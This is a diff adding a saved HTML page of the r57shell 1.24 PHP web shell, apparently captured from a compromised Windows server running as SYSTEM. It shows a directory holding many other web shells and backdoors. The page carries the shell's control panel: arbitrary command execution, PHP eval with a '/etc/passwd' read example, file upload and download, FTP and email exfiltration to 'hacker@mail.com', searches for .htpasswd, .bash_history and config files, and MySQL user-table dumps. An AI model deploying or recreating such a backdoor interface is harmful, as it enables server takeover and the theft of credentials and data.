@@ -1,0 +1,229 @@
+<!-- ??????????  ???? -->
+<html>
+<head>
+    <title>r57shell</title>
+    <meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
+
+    <style>
+        tr {
+            BORDER-RIGHT: #aaaaaa 1px solid;
+            BORDER-TOP: #eeeeee 1px solid;
+            BORDER-LEFT: #eeeeee 1px solid;
+            BORDER-BOTTOM: #aaaaaa 1px solid;
+        }
+
+        td {
+            BORDER-RIGHT: #aaaaaa 1px solid;
+            BORDER-TOP: #eeeeee 1px solid;
+            BORDER-LEFT: #eeeeee 1px solid;
+            BORDER-BOTTOM: #aaaaaa 1px solid;
+        }
+
+        .table1 {
+            BORDER-RIGHT: #cccccc 0px;
+            BORDER-TOP: #cccccc 0px;
+            BORDER-LEFT: #cccccc 0px;
+            BORDER-BOTTOM: #cccccc 0px;
+            BACKGROUND-COLOR: #D4D0C8;
+        }
+
+        .td1 {
+            BORDER-RIGHT: #cccccc 0px;
+            BORDER-TOP: #cccccc 0px;
+            BORDER-LEFT: #cccccc 0px;
+            BORDER-BOTTOM: #cccccc 0px;
+            font: 7pt Verdana;
+        }
+
+        .tr1 {
+            BORDER-RIGHT: #cccccc 0px;
+            BORDER-TOP: #cccccc 0px;
+            BORDER-LEFT: #cccccc 0px;
+            BORDER-BOTTOM: #cccccc 0px;
+        }
+
+        table {
+            BORDER-RIGHT: #eeeeee 1px outset;
+            BORDER-TOP: #eeeeee 1px outset;
+            BORDER-LEFT: #eeeeee 1px outset;
+            BORDER-BOTTOM: #eeeeee 1px outset;
+            BACKGROUND-COLOR: #D4D0C8;
+        }
+
+        input {
+            BORDER-RIGHT: #ffffff 1px solid;
+            BORDER-TOP: #999999 1px solid;
+            BORDER-LEFT: #999999 1px solid;
+            BORDER-BOTTOM: #ffffff 1px solid;
+            BACKGROUND-COLOR: #e4e0d8;
+            font: 8pt Verdana;
+        }
+
+        select {
+            BORDER-RIGHT: #ffffff 1px solid;
+            BORDER-TOP: #999999 1px solid;
+            BORDER-LEFT: #999999 1px solid;
+            BORDER-BOTTOM: #ffffff 1px solid;
+            BACKGROUND-COLOR: #e4e0d8;
+            font: 8pt Verdana;
+        }
+
+        submit {
+            BORDER-RIGHT: buttonhighlight 2px outset;
+            BORDER-TOP: buttonhighlight 2px outset;
+            BORDER-LEFT: buttonhighlight 2px outset;
+            BORDER-BOTTOM: buttonhighlight 2px outset;
+            BACKGROUND-COLOR: #e4e0d8;
+            width: 30%;
+        }
+
+        textarea {
+            BORDER-RIGHT: #ffffff 1px solid;
+            BORDER-TOP: #999999 1px solid;
+            BORDER-LEFT: #999999 1px solid;
+            BORDER-BOTTOM: #ffffff 1px solid;
+            BACKGROUND-COLOR: #e4e0d8;
+            font: Fixedsys bold;
+        }
+
+        BODY {
+            margin-top: 1px;
+            margin-right: 1px;
+            margin-bottom: 1px;
+            margin-left: 1px;
+        }
+
+        A:link {
+            COLOR: red;
+            TEXT-DECORATION: none;
+        }
+
+        A:visited {
+            COLOR: red;
+            TEXT-DECORATION: none;
+        }
+
+        A:active {
+            COLOR: red;
+            TEXT-DECORATION: none;
+        }
+
+        A:hover {
+            color: blue;
+            TEXT-DECORATION: none;
+        }
+    </style>
+</head>
+<body bgcolor="#e4e0d8">
+    <table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000>
+        <tr>
+            <td bgcolor=#cccccc width=160>
+                <font face=Verdana size=2>
+                    &nbsp;&nbsp;
+                    <font face=Webdings size=6><b>!</b></font><b>&nbsp;&nbsp;r57shell 1.24</b>
+                </font>
+            </td>
+            <td bgcolor=#cccccc><font face=Verdana size=-2>&nbsp;&nbsp;<b>26-01-2011 19:54:01</b>&nbsp;&nbsp;<font color=black>[</font> <a href=/bd/r57.php?phpinfo title="Show phpinfo()"><b>phpinfo</b></a> <font color=black>]</font>&nbsp;&nbsp;<font color=black>[</font> <a href=/bd/r57.php?phpini title="Show variables from php.ini"><b>php.ini</b></a> <font color=black>]</font>&nbsp;&nbsp;<font color=black>[</font> <a href=/bd/r57.php?cpu title="View cpu info"><b>cpu</b></a> <font color=black>]</font>&nbsp;&nbsp;<font color=black>[</font> <a href=/bd/r57.php?mem title="View memory info"><b>mem</b></a> <font color=black>]</font>&nbsp;&nbsp;<font color=black>[</font> <a href=/bd/r57.php?tmp title="Delete temp files"><b>tmp</b></a> <font color=black>]</font>&nbsp;&nbsp;<font color=black>[</font> <a href=/bd/r57.php?delete title="Delete script from server"><b>delete</b></a> <font color=black>]</font><br>&nbsp;&nbsp;safe_mode: <b><font color=red>OFF</font></b>&nbsp;&nbsp;PHP version: <b>5.2.6</b>&nbsp;&nbsp;cURL: <b><font color=green>ON</font></b>&nbsp;&nbsp;MySQL: <b><font color=green>ON</font></b>&nbsp;&nbsp;MSSQL: <b><font color=red>OFF</font></b>&nbsp;&nbsp;PostgreSQL: <b><font color=red>OFF</font></b>&nbsp;&nbsp;Oracle: <b><font color=red>OFF</font></b><br>&nbsp;&nbsp;Disable functions : <b><font color=green>NONE</font></b><br>&nbsp;&nbsp;HDD Free : <b>36.37 GB</b> HDD Total : <b>39.99 GB</b></font></td>
+        </tr>
+        <table>
+
+            <table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000>
+                <tr><td align=right width=100><font face=Verdana size=-2><font color=blue><b>OS :&nbsp;<br>Server :&nbsp;<br>User :&nbsp;<br>pwd :&nbsp;</b></font><br></td><td><font face=Verdana size=-2 color=red><b>&nbsp;&nbsp;&nbsp;Windows NT MESUT-A2D1BC2FD 5.2 build 3790<br>&nbsp;&nbsp;&nbsp;Apache/2.2.8 (Win32) PHP/5.2.6<br>&nbsp;&nbsp;&nbsp;SYSTEM<br>&nbsp;&nbsp;&nbsp;C:\AppServ\www\bd<br></font></font></td></tr>
+            </table>
+            <table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000>
+                <tr><td bgcolor=#cccccc><font face=Verdana size=-2>Executed command: <b>dir</b></font></td></tr>
+                <tr>
+                    <td>
+                        <b>
+                            <div align=center>
+                                <textarea name=report cols=121 rows=15>
+                                    Volume in drive C has no label.
+                                    Volume Serial Number is 9C49-8B80
+
+                                    Directory of C:\AppServ\www\bd
+
+                                    01/03/2011  11:11 PM    &lt;DIR&gt;          .
+                                    01/03/2011  11:11 PM    &lt;DIR&gt;          ..
+                                    11/04/2010  09:04 PM    &lt;DIR&gt;          138Shells
+                                    11/04/2010  08:59 PM         1,536,387 138Shells.zip
+                                    11/04/2010  08:22 PM           165,533 c99.php
+                                    04/14/2007  03:37 PM             1,285 cfexec.cfm
+                                    12/18/2006  05:47 PM             1,200 cmd-asp-5.1.asp
+                                    12/18/2006  05:48 PM             1,526 cmdasp.asp
+                                    04/14/2007  03:39 PM             1,400 cmdasp.aspx
+                                    12/18/2006  05:50 PM               725 cmdjsp.jsp
+                                    12/18/2006  05:52 PM             2,451 jsp-reverse.jsp
+                                    11/04/2010  08:20 PM            83,298 nstview.php
+                                    04/14/2007  04:29 PM               585 perlcmd.cgi
+                                    12/18/2006  05:43 PM             2,800 php-backdoor.php
+                                    12/18/2006  05:43 PM             2,800 php-backdoor.php.html
+                                    11/04/2010  08:48 PM           110,624 r57.php
+                                    11/04/2010  08:48 PM           110,624 r57.php.html
+                                    04/14/2007  05:08 PM             1,277 readme.txt
+                                    01/07/2008  03:17 AM             3,801 shell.php
+                                    01/07/2008  03:17 AM             3,801 shell.php.html
+                                    12/18/2006  06:09 PM               328 simple-backdoor.php
+                                    18 File(s)      2,030,445 bytes
+                                    3 Dir(s)  39,055,810,560 bytes free
+                                </textarea>
+                            </div>
+                        </b>
+                    </td>
+                </tr>
+            </table>
+            <table width=100% cellpadding=0 cellspacing=0>
+                <form name= form method=POST><tr><td bgcolor=#cccccc><font face=Verdana size=-2><b><div align=center>:: Execute command on server&nbsp<img src=/bd/r57.php?img =1 onclick="document.getElementById('id1').style.display = 'none'; document.cookie='id1=0;';" title="Hide"><img src=/bd/r57.php?img =2 onclick="document.getElementById('id1').style.display = 'block'; document.cookie='id1=1;';" title="Show"> ::</div></b></font></td></tr><tr><td><div id="id1"><table class=table1 width=100% align=center><tr class=tr1><td class=td1 width=15% align=right><b>Run command <font face=Wingdings color=gray>?</font></b></td><td class=td1 align=left><input type=text name=cmd size=85 value=""></td></tr><tr class=tr1><td class=td1 width=15% align=right><b>Work directory <font face=Wingdings color=gray>?</font></b></td><td class=td1 align=left><input type=text name= dir size=85 value="C:\AppServ\www\bd">&nbsp;&nbsp;&nbsp;&nbsp;<input type=submit name=submit value="Execute"></td></tr></table></div></td></tr></form>
+                <form name= form method=POST><tr><td bgcolor=#cccccc><font face=Verdana size=-2><b><div align=center>:: Edit files&nbsp<img src=/bd/r57.php?img =1 onclick="document.getElementById('id3').style.display = 'none'; document.cookie='id3=0;';" title="Hide"><img src=/bd/r57.php?img =2 onclick="document.getElementById('id3').style.display = 'block'; document.cookie='id3=1;';" title="Show"> ::</div></b></font></td></tr><tr><td><div id="id3"><table class=table1 width=100% align=center><tr class=tr1><td class=td1 width=15% align=right><b>File for edit <font face=Wingdings color=gray>?</font></b></td><td class=td1 align=left><input type=text name=e_name size=85 value="C:\AppServ\www\bd"><input type=hidden name=cmd value="edit_file"><input type=hidden name= dir value="C:\AppServ\www\bd">&nbsp;&nbsp;&nbsp;&nbsp;<input type=submit name=submit value="Edit file"></td></tr></table></div></td></tr></form>
+                <form name= form method=POST><tr><td bgcolor=#cccccc><font face=Verdana size=-2><b><div align=center>:: Aliases&nbsp<img src=/bd/r57.php?img =1 onclick="document.getElementById('id6').style.display = 'none'; document.cookie='id6=0;';" title="Hide"><img src=/bd/r57.php?img =2 onclick="document.getElementById('id6').style.display = 'block'; document.cookie='id6=1;';" title="Show"> ::</div></b></font></td></tr><tr><td><div id="id6"><table class=table1 width=100% align=center><tr class=tr1><td class=td1 width=15% align=right><b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Select alias <font face=Wingdings color=gray>?</font>&nbsp;&nbsp;&nbsp;&nbsp;</b></td><td class=td1 align=left><select name=alias><option>find suid files</option><option>find suid files in current dir</option><option>find sgid files</option><option>find sgid files in current dir</option><option>find config.inc.php files</option><option>find config.inc.php files in current dir</option><option>find config* files</option><option>find config* files in current dir</option><option>find all writable files</option><option>find all writable files in current dir</option><option>find all writable directories</option><option>find all writable directories in current dir</option><option>find all writable directories and files</option><option>find all writable directories and files in current dir</option><option>find all service.pwd files</option><option>find service.pwd files in current dir</option><option>find all .htpasswd files</option><option>find .htpasswd files in current dir</option><option>find all .bash_history files</option><option>find .bash_history files in current dir</option><option>find all .mysql_history files</option><option>find .mysql_history files in current dir</option><option>find all .fetchmailrc files</option><option>find .fetchmailrc files in current dir</option><option>list file attributes on a Linux second extended file system</option><option>show opened ports</option><option>----------------------------------------------------------------------------------------------------</option></select><input type=hidden name= dir value="C:\AppServ\www\bd">&nbsp;&nbsp;&nbsp;&nbsp;<input type=submit name=submit value="Execute"></td></tr></table></div></td></tr></form>
+                <form name= form method=POST><tr><td bgcolor=#cccccc><font face=Verdana size=-2><b><div align=center>:: Find text in files&nbsp<img src=/bd/r57.php?img =1 onclick="document.getElementById('id7').style.display = 'none'; document.cookie='id7=0;';" title="Hide"><img src=/bd/r57.php?img =2 onclick="document.getElementById('id7').style.display = 'block'; document.cookie='id7=1;';" title="Show"> ::</div></b></font></td></tr><tr><td><div id="id7"><table class=table1 width=100% align=center><tr class=tr1><td class=td1 width=15% align=right><b>Find text <font face=Wingdings color=gray>?</font></b></td><td class=td1 align=left><input type=text name=s_text size=85 value="text">&nbsp;&nbsp;&nbsp;&nbsp;<input type=submit name=submit value="Find"></td></tr><tr class=tr1><td class=td1 width=15% align=right><b>In dirs <font face=Wingdings color=gray>?</font></b></td><td class=td1 align=left><input type=text name=s_dir size=85 value="C:\AppServ\www\bd"> * ( /root;/home;/tmp )</td></tr><tr class=tr1><td class=td1 width=15% align=right><b>Only in files <font face=Wingdings color=gray>?</font></b></td><td class=td1 align=left><input type=checkbox name=m id=m value="1"><input type=text name=s_mask size=82 value=".txt;.php">* ( .txt;.php;.htm )<input type=hidden name=cmd value="search_text"><input type=hidden name= dir value="C:\AppServ\www\bd"></td></tr></table></div></td></tr></form>
+                <form name= form method=POST>
+                    <tr><td bgcolor=#cccccc><font face=Verdana size=-2><b><div align=center>:: Eval PHP code&nbsp<img src=/bd/r57.php?img =1 onclick="document.getElementById('id9').style.display = 'none'; document.cookie='id9=0;';" title="Hide"><img src=/bd/r57.php?img =2 onclick="document.getElementById('id9').style.display = 'block'; document.cookie='id9=1;';" title="Show"> ::</div></b></font></td></tr><tr>
+                        <td>
+                            <font face=Verdana size=-2>
+                                <div align=center>
+                                    <div id="id9">
+                                        <textarea name=php_eval cols=100 rows=3>
+                                            /* delete script */
+                                            //unlink("r57shell.php");
+                                            //readfile("/etc/passwd");
+                                        </textarea><input type=hidden name= dir value="C:\AppServ\www\bd"><input type=hidden name=cmd value="php_eval"><br>&nbsp;<input type=submit name=submit value="Execute">
+                                    </div>
+                                </div>
+                            </font>
+                        </td>
+                    </tr>
+                </form>
+                <form name=upload method=POST enctype=multipart/form-data><tr><td bgcolor=#cccccc><font face=Verdana size=-2><b><div align=center>:: Upload files on server&nbsp<img src=/bd/r57.php?img =1 onclick="document.getElementById('id14').style.display = 'none'; document.cookie='id14=0;';" title="Hide"><img src=/bd/r57.php?img =2 onclick="document.getElementById('id14').style.display = 'block'; document.cookie='id14=1;';" title="Show"> ::</div></b></font></td></tr><tr><td><div id="id14"><table class=table1 width=100% align=center><tr class=tr1><td class=td1 width=15% align=right><b>Local file <font face=Wingdings color=gray>?</font></b></td><td class=td1 align=left><input type=file name=userfile size=85 value=""></td></tr><tr class=tr1><td class=td1 width=15% align=right><b>&nbsp;New name <font face=Wingdings color=gray>?</font></b></td><td class=td1 align=left><input type=checkbox name=nf1 id=nf1 value="1"><input type=text name=new_name size=82 value=""><input type=hidden name= dir value="C:\AppServ\www\bd">&nbsp;&nbsp;&nbsp;&nbsp;<input type=submit name=submit value="Upload"></td></tr></table></div></td></tr></form>
+                <form name= form method=POST><tr><td bgcolor=#cccccc><font face=Verdana size=-2><b><div align=center>:: Download files from server&nbsp<img src=/bd/r57.php?img =1 onclick="document.getElementById('id16').style.display = 'none'; document.cookie='id16=0;';" title="Hide"><img src=/bd/r57.php?img =2 onclick="document.getElementById('id16').style.display = 'block'; document.cookie='id16=1;';" title="Show"> ::</div></b></font></td></tr><tr><td><div id="id16"><table class=table1 width=100% align=center><tr class=tr1><td class=td1 width=15% align=right><b>file <font face=Wingdings color=gray>?</font></b></td><td class=td1 align=left><input type=text name=d_name size=85 value="C:\AppServ\www\bd"><input type=hidden name=cmd value="download_file"><input type=hidden name= dir value="C:\AppServ\www\bd">&nbsp;&nbsp;&nbsp;&nbsp;<input type=submit name=submit value="Download"></td></tr><tr class=tr1><td class=td1 width=15% align=right><b>Archivation <font face=Wingdings color=gray>?</font></b></td><td class=td1 align=left><input type=radio name=compress value="none"> without archivation<input type=radio name=compress value="zip"> zip<input type=radio name=compress value="gzip"> gzip</td></tr></table></div></td></tr></form>
+                <tr><td bgcolor=#cccccc><font face=Verdana size=-2><b><div align=center>:: FTP&nbsp<img src=/bd/r57.php?img =1 onclick="document.getElementById('id17').style.display = 'none'; document.cookie='id17=0;';" title="Hide"><img src=/bd/r57.php?img =2 onclick="document.getElementById('id17').style.display = 'block'; document.cookie='id17=1;';" title="Show"> ::</div></b></font></td></tr>
+                <tr><td><div id="id17"><table class=table1 width=100% align=center><tr><form name= form method=POST><td valign=top width=50%><table class=table1 width=100% align=center><font face=Verdana size=-2><b><div align=center id='n'>Download files from remote ftp-server</div></b></font><tr class=tr1><td class=td1 width=25% align=right><b>FTP-server:port <font face=Wingdings color=gray>?</font></b></td><td class=td1 align=left><input type=text name=ftp_server_port size=45 value="127.0.0.1:21"></td></tr><tr class=tr1><td class=td1 width=25% align=right><b>Login <font face=Wingdings color=gray>?</font></b></td><td class=td1 align=left><input type=text name=ftp_login size=45 value="anonymous"></td></tr><tr class=tr1><td class=td1 width=25% align=right><b>Password <font face=Wingdings color=gray>?</font></b></td><td class=td1 align=left><input type=text name=ftp_password size=45 value="billy@microsoft.com"></td></tr><tr class=tr1><td class=td1 width=25% align=right><b>File on ftp <font face=Wingdings color=gray>?</font></b></td><td class=td1 align=left><input type=text name=ftp_file size=45 value="/ftp-dir/file"><input type=hidden name=cmd value="ftp_file_down"></td></tr><tr class=tr1><td class=td1 width=25% align=right><b>Local file <font face=Wingdings color=gray>?</font></b></td><td class=td1 align=left><input type=text name=loc_file size=45 value="C:\AppServ\www\bd"></td></tr><tr class=tr1><td class=td1 width=25% align=right><b>Transfer mode <font face=Wingdings color=gray>?</font></b></td><td class=td1 align=left><select name=ftp_mode><option>FTP_BINARY</option><option>FTP_ASCII</option></select><input type=hidden name= dir value="C:\AppServ\www\bd"></td></tr><tr class=tr1><td class=td1 width=25% align=right></td><td class=td1 align=left><input type=submit name=submit value="Download"></td></tr></table></td></form><form name= form method=POST><td valign=top width=50%><table class=table1 width=100% align=center><font face=Verdana size=-2><b><div align=center id='n'>Send file to remote ftp server</div></b></font><tr class=tr1><td class=td1 width=25% align=right><b>FTP-server:port <font face=Wingdings color=gray>?</font></b></td><td class=td1 align=left><input type=text name=ftp_server_port size=45 value="127.0.0.1:21"></td></tr><tr class=tr1><td class=td1 width=25% align=right><b>Login <font face=Wingdings color=gray>?</font></b></td><td class=td1 align=left><input type=text name=ftp_login size=45 value="anonymous"></td></tr><tr class=tr1><td class=td1 width=25% align=right><b>Password <font face=Wingdings color=gray>?</font></b></td><td class=td1 align=left><input type=text name=ftp_password size=45 value="billy@microsoft.com"></td></tr><tr class=tr1><td class=td1 width=25% align=right><b>Local file <font face=Wingdings color=gray>?</font></b></td><td class=td1 align=left><input type=text name=loc_file size=45 value="C:\AppServ\www\bd"></td></tr><tr class=tr1><td class=td1 width=25% align=right><b>File on ftp <font face=Wingdings color=gray>?</font></b></td><td class=td1 align=left><input type=text name=ftp_file size=45 value="/ftp-dir/file"><input type=hidden name=cmd value="ftp_file_up"></td></tr><tr class=tr1><td class=td1 width=25% align=right><b>Transfer mode <font face=Wingdings color=gray>?</font></b></td><td class=td1 align=left><select name=ftp_mode><option>FTP_BINARY</option><option>FTP_ASCII</option></select><input type=hidden name= dir value="C:\AppServ\www\bd"></td></tr><tr class=tr1><td class=td1 width=25% align=right></td><td class=td1 align=left><input type=submit name=submit value="Upload"></td></tr></table></td></form></tr></div>
+            </table>
+            <tr><td bgcolor=#cccccc><font face=Verdana size=-2><b><div align=center>:: Mail&nbsp<img src=/bd/r57.php?img =1 onclick="document.getElementById('id19').style.display = 'none'; document.cookie='id19=0;';" title="Hide"><img src=/bd/r57.php?img =2 onclick="document.getElementById('id19').style.display = 'block'; document.cookie='id19=1;';" title="Show"> ::</div></b></font></td></tr>
+            <tr><td><div id="id19"><table class=table1 width=100% align=center><tr><form name= form method=POST><td valign=top width=50%><table class=table1 width=100% align=center><font face=Verdana size=-2><b><div align=center id='n'>Send email</div></b></font><tr class=tr1><td class=td1 width=25% align=right><b>To <font face=Wingdings color=gray>?</font></b></td><td class=td1 align=left><input type=text name=to size=45 value="hacker@mail.com"><input type=hidden name=cmd value="mail"><input type=hidden name= dir value="C:\AppServ\www\bd"></td></tr><tr class=tr1><td class=td1 width=25% align=right><b>From <font face=Wingdings color=gray>?</font></b></td><td class=td1 align=left><input type=text name=from size=45 value="billy@microsoft.com"></td></tr><tr class=tr1><td class=td1 width=25% align=right><b>Subj <font face=Wingdings color=gray>?</font></b></td><td class=td1 align=left><input type=text name=subj size=45 value="hello billy"></td></tr><tr class=tr1><td class=td1 width=25% align=right><b>Mail <font face=Wingdings color=gray>?</font></b></td><td class=td1 align=left><textarea name=text cols=33 rows=2>mail text here</textarea></td></tr><tr class=tr1><td class=td1 width=25% align=right></td><td class=td1 align=left><input type=submit name=submit value="Send"></td></tr></table></td></form><form name= form method=POST><td valign=top width=50%><table class=table1 width=100% align=center><font face=Verdana size=-2><b><div align=center id='n'>Send file to email</div></b></font><tr class=tr1><td class=td1 width=25% align=right><b>To <font face=Wingdings color=gray>?</font></b></td><td class=td1 align=left><input type=text name=to size=45 value="hacker@mail.com"><input type=hidden name=cmd value="mail_file"><input type=hidden name= dir value="C:\AppServ\www\bd"></td></tr><tr class=tr1><td class=td1 width=25% align=right><b>From <font face=Wingdings color=gray>?</font></b></td><td class=td1 align=left><input type=text name=from size=45 value="billy@microsoft.com"></td></tr><tr class=tr1><td class=td1 width=25% align=right><b>Subj <font face=Wingdings color=gray>?</font></b></td><td class=td1 align=left><input type=text name=subj size=45 value="file from r57shell"></td></tr><tr class=tr1><td class=td1 width=25% align=right><b>Local file <font face=Wingdings color=gray>?</font></b></td><td class=td1 align=left><input type=text name=loc_file size=45 value="C:\AppServ\www\bd"></td></tr><tr class=tr1><td class=td1 width=25% align=right><b>Archivation <font face=Wingdings color=gray>?</font></b></td><td class=td1 align=left><input type=radio name=compress value="none"> without archivation<input type=radio name=compress value="zip"> zip<input type=radio name=compress value="gzip"> gzip</td></tr><tr class=tr1><td class=td1 width=25% align=right></td><td class=td1 align=left><input type=submit name=submit value="Send"></td></tr></table></td></form></tr></div>
+        </table>
+        <tr><td bgcolor=#cccccc><font face=Verdana size=-2><b><div align=center>:: Databases&nbsp<img src=/bd/r57.php?img =1 onclick="document.getElementById('id20').style.display = 'none'; document.cookie='id20=0;';" title="Hide"><img src=/bd/r57.php?img =2 onclick="document.getElementById('id20').style.display = 'block'; document.cookie='id20=1;';" title="Show"> ::</div></b></font></td></tr>
+        <tr>
+            <td>
+                <div id="id20">
+                    <table class=table1 width=100% align=center>
+                        <tr>
+                            <form name= form method=POST><td valign=top width=34%><table class=table1 width=100% align=center><font face=Verdana size=-2><b><div align=center id='n'>Show database structure</div></b></font><tr class=tr1><td class=td1 width=45% align=right><b>Type <font face=Wingdings color=gray>?</font></b></td><td class=td1 align=left><select name=db><option>MySQL</option></select></td></tr><tr class=tr1><td class=td1 width=45% align=right><b>Port <font face=Wingdings color=gray>?</font></b></td><td class=td1 align=left><input type=text name=db_port size=15 value="3306"></td></tr><tr class=tr1><td class=td1 width=45% align=right><b>Login <font face=Wingdings color=gray>?</font></b></td><td class=td1 align=left><input type=text name=mysql_l size=15 value="root"></td></tr><tr class=tr1><td class=td1 width=45% align=right><b>Password <font face=Wingdings color=gray>?</font></b></td><td class=td1 align=left><input type=text name=mysql_p size=15 value="password"></td></tr><tr class=tr1><td class=td1 width=45% align=right><b>show tables <font face=Wingdings color=gray>?</font></b></td><td class=td1 align=left><input type=hidden name= dir value="C:\AppServ\www\bd"><input type=hidden name=cmd value="db_show"><input type=checkbox name=st id=st value="1"></td></tr><tr class=tr1><td class=td1 width=45% align=right><b>show columns <font face=Wingdings color=gray>?</font></b></td><td class=td1 align=left><input type=checkbox name=sc id=sc value="1"></td></tr><tr class=tr1><td class=td1 width=45% align=right></td><td class=td1 align=left><input type=submit name=submit value="Show"></td></tr></table></td></form>
+                            <form name= form method=POST><td valign=top width=33%><table class=table1 width=100% align=center><font face=Verdana size=-2><b><div align=center id='n'>Dump database table</div></b></font><tr class=tr1><td class=td1 width=45% align=right><b>Type <font face=Wingdings color=gray>?</font></b></td><td class=td1 align=left><select name=db><option>MySQL</option></select></td></tr><tr class=tr1><td class=td1 width=45% align=right><b>Port <font face=Wingdings color=gray>?</font></b></td><td class=td1 align=left><input type=text name=db_port size=15 value="3306"></td></tr><tr class=tr1><td class=td1 width=45% align=right><b>Login <font face=Wingdings color=gray>?</font></b></td><td class=td1 align=left><input type=text name=mysql_l size=15 value="root"></td></tr><tr class=tr1><td class=td1 width=45% align=right><b>Password <font face=Wingdings color=gray>?</font></b></td><td class=td1 align=left><input type=text name=mysql_p size=15 value="password"></td></tr><tr class=tr1><td class=td1 width=45% align=right><b>Database <font face=Wingdings color=gray>?</font></b></td><td class=td1 align=left><input type=text name=mysql_db size=15 value="mysql"></td></tr><tr class=tr1><td class=td1 width=45% align=right><b>Table <font face=Wingdings color=gray>?</font></b></td><td class=td1 align=left><input type=text name=mysql_tbl size=15 value="user"></td></tr><tr class=tr1><td class=td1 width=45% align=right><input type=hidden name= dir value="C:\AppServ\www\bd"><input type=hidden name=cmd value="mysql_dump"><b>Save dump in file <font face=Wingdings color=gray>?</font></b></td><td class=td1 align=left><input type=checkbox name=dif id=dif value="1"></td></tr><tr class=tr1><td class=td1 width=45% align=right><b>file <font face=Wingdings color=gray>?</font></b></td><td class=td1 align=left><input type=text name=dif_name size=15 value="dump.sql"></td></tr><tr class=tr1><td class=td1 width=45% align=right></td><td class=td1 align=left><input type=submit name=submit value="Dump"></td></tr></table></td></form>
+                            <form name= form method=POST>
+                                <td valign=top width=33%>
+                                    <table class=table1 width=100% align=center><font face=Verdana size=-2><b><div align=center id='n'>Run SQL query</div></b></font><tr class=tr1><td class=td1 width=45% align=right><b>Type <font face=Wingdings color=gray>?</font></b></td><td class=td1 align=left><select name=db><option>MySQL</option></select></td></tr><tr class=tr1><td class=td1 width=45% align=right><b>Port <font face=Wingdings color=gray>?</font></b></td><td class=td1 align=left><input type=text name=db_port size=15 value="3306"></td></tr><tr class=tr1><td class=td1 width=45% align=right><b>Login <font face=Wingdings color=gray>?</font></b></td><td class=td1 align=left><input type=text name=mysql_l size=15 value="root"></td></tr><tr class=tr1><td class=td1 width=45% align=right><b>Password <font face=Wingdings color=gray>?</font></b></td><td class=td1 align=left><input type=text name=mysql_p size=15 value="password"></td></tr><tr class=tr1><td class=td1 width=45% align=right><b>Database <font face=Wingdings color=gray>?</font></b></td><td class=td1 align=left><input type=text name=mysql_db size=15 value="mysql"></td></tr><tr class=tr1><td class=td1 width=45% align=right><b>SQL query <font face=Wingdings color=gray>?</font></b><input type=hidden name= dir value="C:\AppServ\www\bd"><input type=hidden name=cmd value="db_query"></td><td class=td1 align=left></td></tr></table><div align=center id='n'>
+                                        <textarea cols=35 name=db_query>
+                                            SHOW DATABASES;
+                                            SELECT * FROM user;
+                                        </textarea><br><input type=submit name=submit value="Execute">
+                                    </div>
+                                </td>
+                            </form>
+                        </tr>
+                </div>
+    </table></table><table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc></div></div><div align=center id='n'><font face=Verdana size=-2><b>o---[ r57shell - http-shell by RST/GHC | <a href="http://rst.void.ru" rel="noopener noreferrer">http://rst.void.ru</a> | <a href=http://ghc.ru>http://ghc.ru</a> | <a href=r57.gen.tr>http://r57.gen.tr</a> | version 1.24 ]---o</b></font></div></td></tr></table><br>
+    <script language="javascript">hotlog_js = "1.0"; hotlog_r = "" + Math.random() + "&s=81606&im=1&r=" + escape(document.referrer) + "&pg=" + escape(window.location.href); document.cookie = "hotlog=1; path=/"; hotlog_r += "&c=" + (document.cookie ? "Y" : "N");</script>
+    <script language="javascript1.1">        hotlog_js = "1.1"; hotlog_r += "&j=" + (navigator.javaEnabled() ? "Y" : "N")</script>
+    <script language="javascript1.2">        hotlog_js = "1.2"; hotlog_r += "&wh=" + screen.width + 'x' + screen.height + "&px=" + (((navigator.appName.substring(0, 3) == "Mic")) ? screen.colorDepth : screen.pixelDepth)</script>
+    <script language="javascript1.3">        hotlog_js = "1.3"</script>
+   
